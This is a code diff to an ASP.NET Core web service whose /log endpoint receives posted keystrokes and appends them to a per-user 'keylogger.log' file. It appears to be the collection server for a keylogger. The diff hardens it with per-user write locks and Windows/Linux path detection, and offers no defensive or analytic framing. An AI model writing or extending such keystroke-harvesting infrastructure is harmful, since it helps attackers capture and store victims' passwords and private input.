@@ -6,12 +6,19 @@ using Microsoft.AspNetCore.Http;
 using System.IO;
 using System.Threading.Tasks;
 
+using System.Collections.Concurrent;
+using System.Threading;
+using System.Runtime.InteropServices;
+
 var builder = WebApplication.CreateBuilder(args);
 
 builder.Services.AddEndpointsApiExplorer();
 builder.Services.AddSwaggerGen();
 
 var app = builder.Build();
+
+// Semaphore dictionary to handle concurrent writes per user
+var locks = new ConcurrentDictionary<string, SemaphoreSlim>();
 
 // Always enable Swagger for this analysis/debug phase, 
 // or you can keep it as is if you prefer it only in Development.
@@ -41,14 +48,27 @@ app.MapPost("/log", async (HttpRequest request) =>
     // Sanitize username to prevent directory traversal
     var safeUsername = Path.GetFileName(username);
 
-    var baseUploadPath = "/root/uploads";
+    // Detect if we are running on Windows or Linux to set the base path accordingly
+    var isWindows = RuntimeInformation.IsOSPlatform(OSPlatform.Windows);
+    var baseUploadPath = isWindows ? "C:\\root\\uploads" : "/root/uploads";
+    
     var userUploadPath = Path.Combine(baseUploadPath, safeUsername);
     Directory.CreateDirectory(userUploadPath);
  
     var filePath = Path.Combine(userUploadPath, "keylogger.log");
 
-    // Append the keystrokes to the file
-    await File.AppendAllTextAsync(filePath, content);
+    // Get or create a semaphore for this specific user's log file
+    var userLock = locks.GetOrAdd(safeUsername, _ => new SemaphoreSlim(1, 1));
+    await userLock.WaitAsync();
+    try
+    {
+        // Append the keystrokes to the file
+        await File.AppendAllTextAsync(filePath, content);
+    }
+    finally
+    {
+        userLock.Release();
+    }
 
     return Results.Ok();
 });
